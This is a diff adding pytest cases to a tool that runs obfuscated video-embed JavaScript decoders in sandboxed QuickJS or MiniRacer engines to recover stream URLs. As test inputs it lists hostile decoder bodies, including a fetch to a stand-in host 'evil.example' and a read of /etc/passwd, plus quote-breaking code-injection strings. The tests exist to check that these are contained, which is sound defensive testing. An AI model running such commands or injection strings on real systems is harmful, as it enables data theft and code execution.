@@ -10,7 +10,7 @@ from sestudio.providers.base import ProviderError
 from sestudio.providers.vidzy import VidzyProvider
 
 requires_js = pytest.mark.skipif(
-    not jsdecode.ENGINE_AVAILABLE, reason="quickjs not installed"
+    not jsdecode.ENGINE_AVAILABLE, reason="no JS engine (quickjs/mini-racer) installed"
 )
 
 # The real m3u8 URL we expect the provider to recover from the obfuscated embed.
@@ -257,4 +257,64 @@ def test_jsdecode_contains_hostile_bodies(hostile_body: str):
 def test_jsdecode_payload_cannot_inject_code():
     """The payload is bound, not interpolated, so quotes cannot break out."""
     injected = '");globalThis.pwned=1;("'
+    assert jsdecode.run_inline_decoder("return s", injected) == injected
+
+
+# --- Both engines --------------------------------------------------------- #
+# The engine differs by platform (QuickJS everywhere, MiniRacer on Windows), so
+# whichever one a developer happens to have would otherwise be the only one
+# tested. These force each in turn. The injection case matters most: QuickJS
+# binds the payload, while MiniRacer has to interpolate it as a JSON literal.
+
+
+@pytest.fixture(params=[("quickjs", "MiniRacer"), ("MiniRacer", "quickjs")])
+def engine(request, monkeypatch):
+    """Force one specific engine, skipping if it is not installed here."""
+    wanted, other = request.param
+    if getattr(jsdecode, wanted) is None:
+        pytest.skip(f"{wanted} not installed")
+    monkeypatch.setattr(jsdecode, other, None)
+    monkeypatch.setattr(jsdecode, "ENGINE_NAME", wanted)
+    return wanted
+
+
+def test_either_engine_decodes_a_known_scheme(engine):
+    body = (
+        'var b=atob(s),a=b.split("").reverse().join(""),r="";'
+        "for(var i=0;i<a.length;i++){var kk=(0x3d+i*89)&255;"
+        "r+=String.fromCharCode(a.charCodeAt(i)^kk)}return r"
+    )
+    payload = _encode_pre_reverse(_EXPECTED, 0x3D, 89)
+    assert jsdecode.run_inline_decoder(body, payload) == _EXPECTED
+
+
+@pytest.mark.parametrize(
+    "hostile_body",
+    [
+        'return fetch("https://evil.example/x")',
+        'return require("fs").readFileSync("/etc/passwd")',
+        "while(true){}",
+        "return 42",
+    ],
+)
+def test_either_engine_contains_hostile_bodies(engine, hostile_body: str):
+    assert jsdecode.run_inline_decoder(hostile_body, "aGVsbG8=") is None
+
+
+@pytest.mark.parametrize(
+    "injected",
+    [
+        '");globalThis.pwned=1;("',
+        '\\");globalThis.pwned=1;("',  # an escaped quote must stay escaped
+        "'+globalThis.pwned+'",
+        # Legal inside a JSON string, but line terminators in JavaScript —
+        # the reason json.dumps must keep its default ensure_ascii.
+        "line\u2028separator",
+        "para\u2029graph",
+        "new\nline",
+        'back\\slash"quote',
+    ],
+)
+def test_either_engine_returns_the_payload_verbatim(engine, injected: str):
+    """Nothing in the payload can escape into the surrounding source."""
     assert jsdecode.run_inline_decoder("return s", injected) == injected
